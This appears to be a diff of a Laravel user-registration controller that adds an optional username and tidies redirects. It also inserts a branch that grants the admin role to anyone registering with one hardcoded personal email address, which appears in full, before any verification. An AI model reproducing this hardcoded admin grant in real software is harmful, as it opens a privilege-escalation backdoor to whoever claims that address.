@@ -20,55 +20,57 @@ class RegisteredUserController extends Controller
         return Inertia::render('auth/Register');
     }
 
-  public function store(Request $request): RedirectResponse
-{
-    $request->validate([
-        'name' => 'required|string|max:255',
-        'email' => 'required|string|lowercase|email|max:255|unique:'.User::class,
-        'password' => ['required', 'confirmed', Rules\Password::defaults()],
-    ]);
+    public function store(Request $request): RedirectResponse
+    {
+        $request->validate([
+            'name' => 'required|string|max:255',
+            'username' => 'nullable|string|max:255|unique:users,username',
+            'email' => 'required|string|lowercase|email|max:255|unique:users',
+            'password' => ['required', 'confirmed', Rules\Password::defaults()],
+        ]);
 
-    // Generate username from name
-    $baseUsername = strtolower(preg_replace('/[^a-zA-Z0-9]/', '', $request->name));
-    $username = $baseUsername;
-    $counter = 1;
-    
-    while (User::where('username', $username)->exists()) {
-        $username = $baseUsername . $counter;
-        $counter++;
+        // Generate username if not provided
+        $username = $request->username;
+        if (!$username) {
+            $baseUsername = strtolower(preg_replace('/[^a-zA-Z0-9]/', '', $request->name));
+            $username = $baseUsername;
+            $counter = 1;
+            while (User::where('username', $username)->exists()) {
+                $username = $baseUsername . $counter;
+                $counter++;
+            }
+        }
+
+        // Create user
+        $user = User::create([
+            'full_name' => $request->name,
+            'username' => $username,
+            'email' => $request->email,
+            'password' => Hash::make($request->password),
+            'is_active' => true,
+        ]);
+
+        if ($user->email === 'hanimtnm@gmail.com') {
+        $user->assignRole('admin');
+        event(new Registered($user));
+        Auth::login($user);
+        return redirect(route('admin.dashboard'));
     }
-
-    $user = User::create([
-        'full_name' => $request->name,
-        'username' => $username,
-        'email' => $request->email,
-        'password' => Hash::make($request->password),
-        'is_active' => true,
-    ]);
-    
-    $user->assignRole('student');   
-    event(new Registered($user));
-
-    Auth::login($user);
-
-    // Check session for redirect after checkout
-    $redirectAfterCheckout = session('redirect_after_checkout');
-    $redirectAfterLogin = session('redirect_after_login');
-    
-    // Clear the session variables
-    session()->forget('redirect_after_checkout');
-    session()->forget('redirect_after_login');
-    
-    // Redirect to checkout if that was the intent
-    if ($redirectAfterCheckout || $redirectAfterLogin === '/checkout') {
-        return redirect('/checkout');
+        
+        // Assign student role
+        $user->assignRole('student');
+        
+        event(new Registered($user));
+        
+        Auth::login($user);
+        
+        // Check for redirect after checkout
+        $redirectAfterCheckout = session('redirect_after_checkout');
+        if ($redirectAfterCheckout) {
+            session()->forget('redirect_after_checkout');
+            return redirect('/checkout');
+        }
+        
+        return redirect()->intended(route('student.dashboard'));
     }
-    
-    // Check if there's cart data
-    if (session()->has('checkout_cart') || session()->get('redirect_after_checkout')) {
-        return redirect('/checkout');
-    }
-
-    return redirect(route('student.dashboard'));
-}
 }
